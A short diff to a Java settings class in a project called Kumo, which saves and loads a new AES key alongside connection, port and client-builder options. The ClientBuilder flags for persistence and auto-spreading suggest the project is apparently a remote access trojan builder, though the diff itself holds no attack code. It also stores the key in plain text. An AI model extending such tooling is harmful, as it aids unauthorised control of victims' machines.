@@ -39,6 +39,7 @@ public class PseudoBase implements Repository {
             writer.write(KumoSettings.MAX_CONNECTIONS + " ");
             writer.write(KumoSettings.PORT + " ");
             writer.write(KumoSettings.SOUND + " ");
+            writer.write(KumoSettings.AES_KEY + " ");
         } catch (IOException i) {
             Logger.log(Level.ERROR, i.toString());
         }
@@ -49,7 +50,8 @@ public class PseudoBase implements Repository {
             writer.write("" + KumoSettings.PORT + "\n" + " ");
             writer.write("" + ClientBuilder.isPersistent + "\n" + " ");
             writer.write("" + ClientBuilder.autoSpread + "\n" + " ");
-            writer.write("" + ClientBuilder.isDebug);
+            writer.write("" + ClientBuilder.isDebug + "\n" + " ");
+            writer.write("" + KumoSettings.AES_KEY);
         } catch (IOException i) {
             Logger.log(Level.ERROR, i.toString());
         }
@@ -78,13 +80,14 @@ public class PseudoBase implements Repository {
                 stringBuilder.append(line);
             }
             String[] settings = stringBuilder.toString().split(" ");
-            if (settings.length == 6) {
+            if (settings.length == 7) {
                 KumoSettings.CONNECTION_IP = (settings[0].trim());
                 KumoSettings.SHOW_NOTIFICATIONS = (Boolean.valueOf(settings[1].trim()));
                 KumoSettings.BACKGROUND_PERSISTENT = (Boolean.valueOf(settings[2].trim()));
                 KumoSettings.MAX_CONNECTIONS = (Integer.parseInt(settings[3].trim()));
                 KumoSettings.PORT = (Integer.parseInt(settings[4].trim()));
                 KumoSettings.SOUND = (Boolean.valueOf(settings[5].trim()));
+                KumoSettings.AES_KEY = settings[6].trim();
             }
             Logger.log(Level.INFO,"Kumo server settings loaded.");
         } catch (IOException e) {
